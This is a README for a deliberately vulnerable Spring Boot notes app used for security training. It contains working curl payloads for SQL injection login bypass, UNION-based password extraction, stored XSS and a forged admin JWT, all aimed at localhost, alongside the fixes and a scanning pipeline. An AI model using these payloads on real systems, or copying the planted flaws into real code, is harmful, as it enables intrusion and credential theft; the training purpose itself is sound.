# vulnerable-notes-api

[![build](https://github.com/TellSamuelSomething/vulnerable-notes-api/actions/workflows/build.yml/badge.svg?branch=main)](https://github.com/TellSamuelSomething/vulnerable-notes-api/actions/workflows/build.yml)
[![codeql](https://github.com/TellSamuelSomething/vulnerable-notes-api/actions/workflows/codeql.yml/badge.svg?branch=main)](https://github.com/TellSamuelSomething/vulnerable-notes-api/actions/workflows/codeql.yml)
[![dependency-check](https://github.com/TellSamuelSomething/vulnerable-notes-api/actions/workflows/dependency-check.yml/badge.svg?branch=main)](https://github.com/TellSamuelSomething/vulnerable-notes-api/actions/workflows/dependency-check.yml)

> ## ⚠️ WARNING: INTENTIONALLY VULNERABLE APPLICATION ⚠️
> This is a **deliberately insecure** security-training project, in the spirit of
> [OWASP WebGoat](https://owasp.org/www-project-webgoat/) and [DVWA](https://github.com/digininja/DVWA).
> **Do NOT deploy it** to any server, cloud, or network you don't fully control.
> Run it only on localhost, and never put real data in it.

A small Spring Boot "notes" app with users and notes, built as part of an application-security
learning portfolio. Every flaw is marked in the source with a `// VULN` comment naming its
OWASP Top 10 (2021) category.

## Stack

Java 21 · Spring Boot 3.3.5 (Web, Thymeleaf, JDBC) · H2 in-memory DB (`schema.sql` + `data.sql`) · jjwt 0.12.6

## Run it

```bash
mvn spring-boot:run
```

Then open <http://localhost:8080/notes>.
The H2 console is at <http://localhost:8080/h2-console> (JDBC URL `jdbc:h2:mem:vulnnotes`, user `sa`, empty password).

Seeded users:

| Username | Password      | Role  |
|----------|---------------|-------|
| alice    | alicepass     | USER  |
| bob      | bobpass       | USER  |
| admin    | sup3rs3cr3t   | ADMIN |

## Vulnerabilities

| # | Vulnerability                  | OWASP 2021 category                                                       | Where |
|---|--------------------------------|---------------------------------------------------------------------------|-------|
| 1 | SQL injection in login         | A03 Injection                                                             | `AuthController` `POST /api/login` |
| 2 | IDOR on notes                  | A01 Broken Access Control                                                 | `NoteApiController` `GET /api/notes/{id}` |
| 3 | Stored XSS                     | A03 Injection                                                             | `notes.html` (`th:utext`), `POST /notes` |
| 4 | Weak JWT (hard-coded secret, no expiry) | A02 Cryptographic Failures / A07 Identification & Authentication Failures | `JwtUtil` |
| 5 | Plaintext passwords            | A02 Cryptographic Failures                                                | `schema.sql`, `data.sql`, `AuthController` |

## Exploits

All commands are for bash (Linux, macOS, Git Bash, WSL) with the app running on port 8080.

### 1. SQL injection: log in as anyone (A03)

The login query is built by string concatenation.

```bash
# Log in as admin without the password: the comment cuts off the password check
curl -s -X POST http://localhost:8080/api/login -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin'--\",\"password\":\"x\"}"

# Classic tautology: logs in as the first user in the table (alice)
curl -s -X POST http://localhost:8080/api/login -H 'Content-Type: application/json' \
  -d "{\"username\":\"x\",\"password\":\"' OR '1'='1\"}"
```

Both return a valid JWT.

### 2. IDOR: read anyone's private note (A01)

No token and no ownership check needed:

```bash
curl -s http://localhost:8080/api/notes/4   # admin's "prod creds" note
curl -s http://localhost:8080/api/notes/2   # alice's bank PIN
```

### 3. Stored XSS (A03)

```bash
curl -s -X POST http://localhost:8080/notes \
  --data-urlencode 'title=<img src=x onerror=alert(document.domain)>' \
  --data-urlencode 'content=<img src=x onerror=alert("stored XSS")>'
```

Open <http://localhost:8080/notes>. The payload runs for every visitor.
You can also paste the payload into the "Add note" form.

### 4. Weak JWT: forge an admin token (A02/A07)

The signing secret is in the source (`JwtUtil.SECRET`), so anyone can sign their own tokens.
Tokens also have no `exp` claim, so a stolen token works forever.

```bash
b64() { openssl base64 -A | tr '+/' '-_' | tr -d '='; }
H=$(printf '{"alg":"HS256"}' | b64)
P=$(printf '{"sub":"admin","role":"ADMIN"}' | b64)
S=$(printf '%s.%s' "$H" "$P" | openssl dgst -sha256 -hmac 'vuln-notes-hardcoded-secret-key!' -binary | b64)

curl -s http://localhost:8080/api/me -H "Authorization: Bearer $H.$P.$S"
# {"role":"ADMIN","username":"admin","expires":"null"}
```

### 5. Plaintext passwords (A02)

Passwords are stored in cleartext, so any database read leaks them directly.
Combined with #1, a `UNION` injection returns admin's password inside the login response:

```bash
curl -s -X POST http://localhost:8080/api/login -H 'Content-Type: application/json' \
  -d "{\"username\":\"x\",\"password\":\"' UNION SELECT 1, username || ':' || password, role FROM users WHERE username='admin\"}"
# ..."username":"admin:sup3rs3cr3t"...
```

You can also run `SELECT * FROM users;` in the H2 console.

## Fixes: `secure` branch

The [`secure`](../../tree/secure) branch fixes every issue, so you can diff the two branches side by side (`git diff main secure`):

| # | Fix |
|---|-----|
| 1 | Parameterized queries (`?` placeholders with `JdbcTemplate`) |
| 2 | Require authentication on `/api/notes/{id}` and check that the caller owns the note |
| 3 | Output escaping (`th:text` instead of `th:utext`) plus a Content-Security-Policy header |
| 4 | Signing secret moved out of the code (environment variable or secret manager) and tokens given an expiry |
| 5 | BCrypt password hashing |

## Security pipeline (DevSecOps)

Three GitHub Actions workflows run on every push and pull request to `main` and `secure`:

| Workflow | Type | What it does |
|----------|------|--------------|
| [`build.yml`](.github/workflows/build.yml) | Build gate | JDK 21, `mvn -B clean verify`: the project must compile and its tests must pass. |
| [`codeql.yml`](.github/workflows/codeql.yml) | SAST | GitHub CodeQL analyses the Java code (also weekly). Results go to **Security → Code scanning**. |
| [`dependency-check.yml`](.github/workflows/dependency-check.yml) | SCA | OWASP Dependency-Check looks up every Maven dependency in the CVE database (also weekly). The HTML and SARIF reports are saved as a build artifact, and the SARIF goes to the Security tab. The job fails on any CVSS 7.0+ finding, but only after the report is published. |

**Findings are expected.** This project is intentionally vulnerable, so red scanners on `main` are
the point: they prove the pipeline catches real problems. Compare with the `secure` branch.

The two scanners cover the two halves of AppSec:

- **CodeQL** finds bugs in *our own code*, such as the SQL injection and XSS.
- **Dependency-Check** finds known vulnerabilities in *other people's code*: the libraries we depend on.

All actions are pinned to full commit SHAs, so a hijacked or re-tagged action version can't change what runs.

Dependency-Check needs a free [NVD API key](https://nvd.nist.gov/developers/request-an-api-key) stored as the repository secret `NVD_API_KEY`.

## Disclaimer

For education only. Use the techniques shown here only against systems you own or are authorized to test.
